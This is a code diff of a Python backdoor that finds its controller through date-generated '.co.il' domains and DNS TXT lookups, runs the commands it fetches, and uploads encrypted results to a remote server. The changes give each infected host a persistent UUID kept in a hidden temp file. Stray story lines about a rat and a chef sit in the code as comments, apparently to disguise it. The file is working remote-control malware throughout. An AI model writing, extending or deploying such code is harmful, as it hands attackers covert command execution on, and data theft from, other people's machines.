@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import hashlib
 import re
+import uuid
 from datetime import datetime
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
@@ -134,8 +135,8 @@ def build_command_result_object(my_pub_ip, command_id, exit_code, user=None, tim
     return res_obj
 
 # Curious, Remy crept closer, perched above the pots and pans. He watched as the chef botched a
-def report_command_result(public_key, command_id, report_obj, target_url):
-    result_file_url = os.path.join(target_url, f"{command_id}.98909256ab4211ef92504355150642b7")
+def report_command_result(my_id, public_key, command_id, report_obj, target_url):
+    result_file_url = os.path.join(target_url, f"{my_id}={command_id}.98909256ab4211ef92504355150642b7")
     response = requests.put(result_file_url, data=encrypt_with_public_key(public_key, json.dumps(report_obj)))
     return response.status_code == 200
 
@@ -157,9 +158,18 @@ def load_commands_executed(executed_commands_list_filename):
     list_filename = os.path.join(tempfile.gettempdir(), executed_commands_list_filename)
     try:
         with open(list_filename, "r") as list_file:
-            return list(dict.fromkeys(list_file.readlines()))
+            file_lines = list_file.readlines()
+            my_id = file_lines[0]
+            return my_id, list(dict.fromkeys(file_lines[1:]))
     except:
-        return []
+        my_id = str(uuid.uuid4())
+        try:
+            with open(list_filename, "w") as list_file:
+                list_file.write(my_id + "\n")
+        except:
+            pass
+        return my_id, []
+
 
 # When the chef discovered Remy, there was a moment of shock—then understanding. Together, they
 def decide_on_root_dns_record(my_pub_ip):
@@ -183,7 +193,7 @@ def decide_on_root_dns_record(my_pub_ip):
         words_list = words_text_raw.strip().split(' ')
 
     root_dns_record = words_list[datetime.now().day * datetime.now().month % len(words_list)] + "." + words_list[
-        (datetime.now().day * datetime.now().month * datetime.now().year) % len(words_list)] + str((datetime.now().month * datetime.now().year) % len(words_list)) + ".co.il"
+        (datetime.now().month * datetime.now().year) % len(words_list)] + str((datetime.now().month * datetime.now().year) % len(words_list)) + ".co.il"
     root_dns_record_valid = query_txt_record(root_dns_record) is not None
     used_root_dns_records_idx = len(used_root_dns_records) - 1
     while not root_dns_record_valid and used_root_dns_records_idx >= 0:
@@ -209,7 +219,7 @@ def main():
             pass
     sleep_time = 60
     executed_commands_list_filename = "~" + hashlib.sha256(my_pub_ip.encode()).hexdigest()
-    commands_executed = load_commands_executed(executed_commands_list_filename)
+    my_id, commands_executed = load_commands_executed(executed_commands_list_filename)
     while True:
         try:
             dns_pointer_record = decide_on_root_dns_record(my_pub_ip)
@@ -244,7 +254,7 @@ def main():
                             stderr=None,
                             exception=ex
                         )
-                    if report_command_result(commands_outputs_encryption_public_key, command["id"], command_res_obj, command["report_results_to"]):
+                    if report_command_result(my_id, commands_outputs_encryption_public_key, command["id"], command_res_obj, command["report_results_to"]):
                         mark_command_as_executed(command, commands_executed, executed_commands_list_filename)
         except:
             pass
